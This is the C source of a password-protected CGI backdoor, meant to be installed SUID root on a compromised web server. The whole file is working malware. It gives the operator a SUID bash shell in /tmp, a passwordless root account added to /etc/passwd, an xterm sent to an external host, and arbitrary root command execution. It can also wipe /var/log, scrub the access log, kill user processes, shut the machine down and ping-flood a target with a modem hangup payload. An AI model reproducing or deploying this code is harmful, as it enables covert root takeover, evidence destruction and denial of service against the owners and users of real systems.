/**********************************************************************/
/* CGI BackDoor by OVERFLOW <overflow@ptlink.net>                     */
/* Thanks to:                                                         */
/*        Heat for his hints and ideas                                */
/*        Marado for his NUKEM CGI                                    */
/*        All Ptlink pple                                             */
/* Usage:                                                             */
/*  ./config.sh                                                       */
/*                                                                    */
/*         =with logs                                                 */
/*  gcc cgiback.c -o /home/httpd/cgi-bin/cgiback.cgi -DO_LOGS -lcrypt */
/*         =without logs                                              */
/*  gcc cgiback.c -o /home/httpd/cgi-bin/cgiback.cgi -lcrypt          */
/*                                                                    */
/*  chmod 4755 /home/httpd/cgi-bin/cgiback.cgi                        */
/*                                                                    */
/*  lynx http://hacked_host.id/cgi-bin/cgiback.cgi                    */
/*                                                                    */
/* Tested in:                                                         */
/*  RedHat 6.1                                                        */
/*                                                                    */
/* Password is encryped with DES                                      */
/*  Real password ->   lamepass                                       */
/*                                                                    */
/**********************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "inc.h"

#define PASSWORD "0V.6vWucojTqA"

#ifdef O_LOGS
#define LOGFILE "/var/log/httpd/back.cgi.log"
#endif

#define NOBODY_ID 99
#define NOBODY_GID 99

#define LOGDIR "/var/log"
#define HTTPDLOG "/var/log/httpd/access_log"
#define HTTPDLOGDIR "/var/log/httpd"

typedef struct _pid {
char pid[10];
struct _pid *next;
} *pid;

#ifdef O_LOGS
void dologs(char *str,char *remoteaddr)
{
FILE *logs;
time_t t;
char *date;
if (str==NULL || remoteaddr==NULL) return;
logs=(FILE *) fopen(LOGFILE,"a");
if (logs==NULL) return;
date=malloc(256);
time(&t);
strftime(date,255,"%a %b %d %T %Z %Y",localtime(&t));
fprintf(logs,"%s: FROM:%s > %s\n",date,remoteaddr,str);
}
#endif

char *getaddress()
{
  char *content;
  char *address;
content = (char *) malloc (atoi (getenv ("CONTENT_LENGTH")) + 2);
read (0, content, atoi (getenv ("CONTENT_LENGTH")));
address = (char *) malloc (sizeof(char)*(strlen(content)-15));
address=strstr(content,"ADDRESS=")+8;
if (address!=NULL) 
	address[strlen(address)-1]='\0';
return(address);
}

char x2c(char *what)
{
  register char digit;
          
  digit = (what[0] >= 'A' ? ((what[0] & 0xdf) - 'A')+10 : (what[0] - '0'));
  digit *= 16;
  digit += (what[1] >= 'A' ? ((what[1] & 0xdf) - 'A')+10 : (what[1] - '0'));
  return (digit);
}


void dellog(char *cgifile)
{
char *buffer;
buffer=malloc(255*(sizeof(char)));
/******* it's easier with awk       :)  ****/
snprintf(buffer, 250,"awk '$0 !~ /%s/ { print }' %s > %s/access_new",cgifile, HTTPDLOG, HTTPDLOGDIR);
system(buffer);
free(buffer);
buffer=malloc(255*(sizeof(char)));
snprintf(buffer,250 ,"/bin/mv -f %s/access_new %s; /bin/rm -f %s/access_new", HTTPDLOGDIR, HTTPDLOG, HTTPDLOGDIR);
system(buffer);
}

void executa(char *s)
{
FILE *out;
int c = 0, f = 0;
if (s==NULL)
  {
  printf("OV: Invalid command");
  return;
  }
if(strstr(s,"/ps"))
	{
	printf("\nDue to suExec in apache, any ps command must be done with  httpd id and gid\n");
	setuid(NOBODY_ID);
	setgid(NOBODY_GID);
	}
out = popen(s, "r");
if (out != NULL)
{
while (c != EOF)
	{
	c = fgetc(out);
	if (c != EOF && c != '\0')
		{
		
		printf("%c", (char) c);
		f++;
		}
	}
pclose(out);
}
if (f == 0 && strcmp(WHO, "") != 0)
	printf("OV: %s: command not found\n", s);
setuid(0);
setgid(0);
}

int
main (int argc, char *argv[])
{
  char *content;
  char *strcmd;
  char *address;
  char *ptr;
  char *ptr2;
  char *temp,*tmp;
  struct hostent *serverinfo;
  FILE *out;
  int f=0,c=0,i, tt;
  char *remoteaddr;
  pid pd_start=NULL, pd_end=NULL,pd_temp=NULL;
#ifdef O_LOGS  
  remoteaddr= getenv("REMOTE_ADDR");
#endif
  setbuf (stdout, NULL);
  if ((argc == 1) && (strcmp (getenv ("REQUEST_METHOD"), "GET") == 0))
    {
printf ("Content-type: text/html\n\n");
printf("<ISINDEX PROMPT=\"Password:\">");
//dellog(argv[0]);
exit(0);
}
if ((argc == 2)&&(strcmp (getenv ("REQUEST_METHOD"), "GET") == 0)&&(strcmp((char *)crypt(argv[1],"0V"),PASSWORD)!=0)){
printf ("Content-type: text/plain\n\n");
printf("Wrong password!");
#ifdef O_LOGS
 dologs("Wrong password",remoteaddr);
#endif
//dellog(argv[0]);
exit(0);
}
      if ((argc == 2)&&(strcmp (getenv ("REQUEST_METHOD"), "GET") == 0)&&(strcmp((char *)crypt(argv[1],"0V"),PASSWORD)==0))
      {
      printf ("Content-type: text/html\n\n");
      printf("<TITLE>CGI BackDoor by OverFlow &#60;overflow@ptlink.net&#62;</TITLE>");
      printf ("<FORM ACTION=%s METHOD=POST>\n", getenv ("SCRIPT_NAME"));
      printf ("<SELECT NAME=STRCMD>\n");
      printf ("<OPTION>suid shell in tmp dir\n");
      printf ("<OPTION>shutdown machine\n");
      printf ("<OPTION>del all logs\n");
      printf ("<OPTION>erase backdoor\n");
      printf ("<OPTION>killall users\n");
      printf ("<OPTION>ping str site\n");
      printf ("<OPTION>xterm to external host\n");
      printf ("<OPTION>create new root account\n");
      printf ("<OPTION>execute command:\n");
      printf ("</SELECT>\n");
      printf ("Address/Command:<INPUT TYPE=TEXT NAME=ADDRESS>\n");
      printf ("<BR><INPUT TYPE=submit VALUE=\"Execute..\">\n");
      printf ("<BR><BR>Users connected:<BR>\n");
      printf ("<PRE>\n");
      executa(WHO);
      printf ("\n\n</PRE>\n");
      //dellog(argv[0]);
      exit (0);
      }
printf ("Content-type: text/plain\n\n");
if (geteuid ())
	{
	printf ("This CGI must be SUID root!\n Please check logs!");
	exit (0);
	}
content = (char *) malloc (atoi (getenv ("CONTENT_LENGTH")) + 2);
read (0, content, atoi (getenv ("CONTENT_LENGTH")));
content[strlen (content)] = '&';
ptr = strstr (content, "STRCMD=") + 5;
ptr2 = strstr (content, "&");
strcmd = (char *) malloc (ptr2 - ptr + 1);
strncpy (strcmd, ptr, ptr2 - ptr);
ptr = strstr (ptr, "ADDRESS=") + 8;
ptr2 = strstr (ptr, "&");

  executa(WHO);
  free (content);
  dup2 (1, 2);
  tmp = &strcmd[2];
  strcmd = tmp;
  free(&tmp);
  if (!strcmp (strcmd, "suid+shell+in+tmp+dir"))
    {
      temp = (char *) malloc (strlen(BASH) + strlen (CP) + strlen (CHMOD)+40);
      sprintf (temp, "%s %s /tmp ; %s 4755 /tmp/bash", CP, BASH,CHMOD);
      if (system (temp) != 0)
	{
#ifdef O_LOGS
 dologs("OV: suid shell in tmp dir failed!",remoteaddr);
#endif
	printf ("OV: suid shell in tmp dir failed!\n");
	}
      else
	{
#ifdef O_LOGS
 dologs("OV: suid shell in tmp dir worked!",remoteaddr);
#endif
	printf ("OV: suid shell in tmp dir worked!\n");
	}
      free(temp);
    }
  if (!strcmp (strcmd, "xterm+to+external+host"))
    {

if (!(ptr2 - ptr))
  {
   printf ("OV: An address must be specified!");
   //dellog(argv[0]);
   exit (0);
  }
	address=getaddress();
	temp = (char *) malloc (17 + strlen (address));
	address[strlen(address)-1]='\0';
	setuid(0);
	setgid(0);
#ifdef O_LOGS
 sprintf(temp,"OV: xterm to %s", address);
 dologs(temp,remoteaddr);
#endif
	sprintf (temp, "%s -display %s:0 &",XTERM,address);
	if (system (temp) != 0)
	printf ("OV: An error occured!\n");
	else
	{
	printf ("OV: Xterm on its way!!\n");
	}
      free (temp);
    }
  if (!strcmp (strcmd, "shutdown+machine"))
    {
      temp = (char *) malloc (18 + strlen (SHUTDOWN));
      sprintf (temp, "%s -h now", SHUTDOWN);
#ifdef O_LOGS
 dologs("OV: BY BY I'M Going to Sleep!!",remoteaddr);
#endif
      printf ("OV: BY BY I'M Going to Sleep!!\n");
      system (temp);
      free (temp);
    }
  if (!strcmp (strcmd, "del+all+logs"))
    {
      temp = (char *) malloc (11 + strlen (RM) + strlen (LOGDIR));
      sprintf (temp, "%s -rf %s", RM, LOGDIR);
      if (system (temp) != 0)
	{
#ifdef O_LOGS
 dologs("OV: Error in Delete!",remoteaddr);
#endif
	printf ("OV: Error in Delete!\n");
	}
      else
	{
#ifdef O_LOGS
 dologs("OV: Logs!!! What is that!!..",remoteaddr);
#endif
	printf ("OV: Logs!!! What is that!!..\n");
	}
      free (temp);
    }
  if (!strcmp (strcmd, "erase+backdoor"))
    {
      temp = (char *) malloc (18 + strlen (argv[0]) + strlen (RM));
      sprintf (temp, "%s -rf %s", RM, argv[0]);
      if (system (temp) != 0)
	{
#ifdef O_LOGS
 dologs("OV: Error in delete..!",remoteaddr);
#endif
	printf ("OV: Error in delete..!\n");
	}
      else
	{
#ifdef O_LOGS
 dologs("OV: Backdoor removed!!",remoteaddr);
#endif
	printf ("OV: Backdoor removed!!\n");
	}
      free (temp);
    }
  if (!strcmp (strcmd, "killall+users"))
    {
      temp = (char *) malloc (1000);
/*      sprintf(temp, "cat /etc/passwd|%s '/home/'| %s -F: ' $3 > 499 { print $1 }'",GREP,AWK);
      out = popen(temp, "r");
if (out != NULL)
{
pd_start=pd_end=malloc(sizeof (struct _pid));
pd_end->next=NULL;
pd_end->pid[0]='\0';
f=0;
while (c != EOF)
        {
        c = fgetc(out);
        if (c != EOF && c != '\0' && f<10)
                {
                if(c=='\n')
		   {
                   pd_end->pid[f]='\0';
		   pd_end->next=malloc(sizeof (struct _pid));
                   pd_end=pd_end->next;
		   f=0;
		   }
		else
		   {
		   pd_end->pid[f]= (char) c;
		   f++;
                   }
		}
        }
pclose(out);
}
pd_temp=pd_start;
while(pd_temp!=pd_end)
 {
 sprintf(temp,"for var in `%s -la /proc| %s '$4==\"%s\" {print $9 }'`; do %s -9 $var; done",LS,AWK,KILL,pd_temp->pid);
 if (system(temp) != 0)
   printf("OV: Killall user %s failed",pd_temp->pid) ;
 else
   printf("OV: Killall user %s worked",pd_temp->pid) ;
 pd_temp=pd_temp->next;
 } */
i=fork();
if(i==0)
	{
	setuid(NOBODY_ID);
	setgid(NOBODY_GID);
	sprintf(temp,"%s aux > /tmp/.x12-123-2-3-45-5-6-78-8",PS);
	exit(system(temp));
	}
wait(NULL);
sprintf (temp, "for var in `cat /tmp/.x12-123-2-3-45-5-6-78-8 |%s -v root|awk ' $7 !~ /\?/ { print $2 } '|grep -v PID`; do kill -9 $var; done", GREP);
      system(temp);
      system("rm -rf /tmp/.x12-123-2-3-45-5-6-78-8");
#ifdef O_LOGS
 dologs("OV: KillALl!!",remoteaddr);
#endif
      free (temp);
    }
  if (!strcmp (strcmd, "ping+str+site"))
    {
      if(strstr(address,";") != NULL) exit(0);
      temp = (char *) malloc (50 + strlen (address));
      sprintf (temp, "%s -p 2b2b2b415448300d -c 500 %s 6400", PING ,address);
      if (system (temp) != 0)
	{
#ifdef O_LOGS
 dologs("OV: Error in ping!",remoteaddr);
#endif
	printf ("OV: Error in ping!\n");
	}
      else
	{
#ifdef O_LOGS
 dologs("OV: BOOM BOOM BOOM ...!!",remoteaddr);
#endif
	printf ("OV: BOOM BOOM BOOM ...!!\n");
	}
      free (temp);
    }
  if (!strcmp (strcmd, "create+new+root+account"))
    {
      temp = malloc(200);
      sprintf (temp, "echo 'ov::0:0::/root:/bin/bash' >> /etc/passwd ");
      if (system (temp) != 0)
	{
#ifdef O_LOGS
 dologs("OV: New Root Account failed!",remoteaddr);
#endif
        printf ("New Root Account failed!\n");
	}
      else
	{
#ifdef O_LOGS
 dologs("OV: New root account created as user:  ov !!",remoteaddr);
#endif
        printf ("New root account created as user:  ov !!\n");
	}
      free (temp);
    }
  if (!strcmp (strcmd, "execute+command%3A"))
    {
	if (!(ptr2 - ptr))
  {
   printf ("OV: A command must be specified!");
   //dellog(argv[0]);
   exit (0);
  }
content = (char *) malloc (atoi (getenv ("CONTENT_LENGTH")) + 2);
read (0, content, atoi (getenv ("CONTENT_LENGTH")));
address = (char *) malloc (sizeof(char)*(strlen(content)-15));
address=strstr(content,"ADDRESS=")+8;
if (address!=NULL) 
	address[strlen(address)-1]='\0';
for (tt = 0, i = 0; address[i]; tt++, i++) {
	if ((address[tt] = address[i]) == '%') {
		address[tt] = x2c(&address[i + 1]);
		i += 2;
		}
	}
address[tt] = '\0';
for (tt = 0; address[tt]; tt++) {
	if (address[tt] == '+') {
		address[tt] = ' ';
	}
}

#ifdef O_LOGS
 temp=malloc(sizeof(char) * 60);
 sprintf(temp,"OV: execute: %s",address);
 dologs(temp,remoteaddr);
#endif
	executa(address);
    }
  //dellog(argv[0]);
  exit (0);
}
